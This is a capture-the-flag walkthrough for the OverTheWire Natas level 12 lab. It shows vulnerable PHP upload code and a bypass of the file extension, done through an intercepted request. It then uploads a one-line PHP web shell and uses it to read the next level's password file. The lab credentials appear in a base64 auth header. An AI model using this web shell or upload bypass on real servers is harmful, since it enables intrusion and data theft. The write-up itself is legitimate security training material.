# level 12

**Host**: http://natas12.natas.labs.overthewire.org
>natas12:yZdkjAYZRd3R7tq7T5kXMj**********

When you visit the site, you get the following message:

```
Choose a JPEG to upload (max 1KB):
```

### Solution:

When you click on the "View source" link you get following php code:

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

So when we upload a file it gets a 10 character lenght random filename and the file extension is set to `.jpg`. The function `makeRandomPath($dir, $ext)` take the file extension as input so we can intercept the upload process with burpsuite and change the file extension to `.php`.

Create a php shell oneliner and name it shell.php:

```php
<?php echo system($_GET["cmd"]); ?>
```

Upload this file with `Intercept on` in your burpsuite and change the file extension.

```html
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary1c08c3a23c545a827eb81ed5fcd96ef5
Content-Length: 498
Origin: http://natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Connection: keep-alive
Referer: http://natas12.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary1c08c3a23c545a827eb81ed5fcd96ef5
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------geckoformboundary1c08c3a23c545a827eb81ed5fcd96ef5
Content-Disposition: form-data; name="filename"

5vbtysvziy.php
------geckoformboundary1c08c3a23c545a827eb81ed5fcd96ef5
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: text/php

<?php echo system($_GET["cmd"]); ?>

------geckoformboundary1c08c3a23c545a827eb81ed5fcd96ef5--
```

Request the uploaded location `/upload/gg11gnhaei.php` and use the `?cmd=` parameter to grab the password for natas13.

```http
GET /upload/gg11gnhaei.php?cmd=cat+/etc/natas_webpass/natas13 HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```http
HTTP/1.1 200 OK
Date: Thu, 04 Sep 2025 10:42:34 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 65
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

trbs5pCjCrkuSknBBKHhaB**********
```